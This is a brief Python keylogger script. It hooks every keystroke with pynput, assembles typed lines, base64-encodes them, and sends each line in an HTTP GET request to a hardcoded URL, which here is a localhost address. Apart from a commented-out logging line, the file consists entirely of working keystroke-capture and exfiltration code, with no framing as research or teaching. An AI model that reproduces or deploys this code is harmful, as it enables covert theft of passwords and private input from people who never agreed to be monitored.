#!/usr/bin/python3
from pynput.keyboard import Key, Listener
import logging
import base64
import requests

URL = "http://127.0.0.1:8080"

#logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

inputString = []
def on_press(key):
    char = str(key).replace("Key.", "")
    if char == "enter" and len(inputString) > 0:
        logger(inputString)
        inputString.clear()
    elif char == "space":
        char = " "
        inputString.append(char)
    elif char == "tab":
        char = "    "
        inputString.append(char)
    elif char == "backspace":
        if len(inputString) > 0:
            inputString.pop()
    elif char != "enter":
        inputString.append(char)

def logger (string):
    tmp = ""
    b64 = base64.b64encode(bytes(tmp.join(string).replace("'",""), "utf-8"))
    b64_message = b64.decode("ascii")
    #logging.info(b64_message)
    r = requests.get(url = URL, params = b64_message)
    
with Listener(on_press=on_press) as listener :
    listener.join()
